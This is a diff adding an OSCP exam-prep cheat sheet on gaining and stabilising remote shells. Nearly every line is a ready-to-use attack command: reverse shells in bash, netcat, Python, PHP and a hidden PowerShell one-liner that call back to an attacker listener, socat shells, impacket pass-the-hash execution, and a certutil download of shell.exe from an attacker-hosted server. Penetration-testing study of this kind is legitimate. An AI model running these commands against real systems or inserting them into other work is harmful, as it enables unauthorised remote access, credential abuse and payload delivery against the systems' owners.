@@ -1,0 +1,74 @@
+######################################################################
+# 07 – SHELLS & STABILIZATION (OSCP 2025)
+######################################################################
+
+===============================
+# 1. Netcat Reverse Shells
+===============================
+# Listener (Kali)
+nc -lvnp 4444
+
+# Bash reverse shell
+bash -i >& /dev/tcp/$localip/4444 0>&1
+
+# Netcat traditional
+nc $localip 4444 -e /bin/bash
+
+# If -e is disabled (OSCP common)
+rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc $localip 4444 > /tmp/f
+
+===============================
+# 2. Python Reverse Shell
+===============================
+python3 -c 'import socket,os,pty,s; s=socket.socket(); s.connect(("'$localip'",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")'
+
+===============================
+# 3. PHP Reverse Shell
+===============================
+php -r '$sock=fsockopen("'$localip'",4444); exec("/bin/sh -i <&3 >&3 2>&3");'
+
+===============================
+# 4. PowerShell Reverse Shell (Windows)
+===============================
+powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('$localip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
+===============================
+# 5. Upgrading to TTY (Linux)
+===============================
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Then on Kali:
+^Z
+stty raw -echo
+fg
+reset
+
+===============================
+# 6. Socat Full TTY Shell
+===============================
+# Listener (Kali)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# Target
+socat tcp:$localip:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
+
+===============================
+# 7. Windows SYSTEM Shell Methods
+===============================
+# PsExec (hash or credentials)
+impacket-psexec $domain/$user@$targetip -hashes <LMHASH:NTLMHASH>
+
+# WMIC Exec
+impacket-wmiexec $domain/$user:$password@$targetip
+
+===============================
+# 8. Reverse Shell File Hosting
+===============================
+python3 -m http.server 80
+
+# Download (Windows)
+certutil -urlcache -split -f http://$localip/shell.exe shell.exe
+
+######################################################################
+# END OF 07_SHELLS_AND_STABILIZATION.TXT
+######################################################################
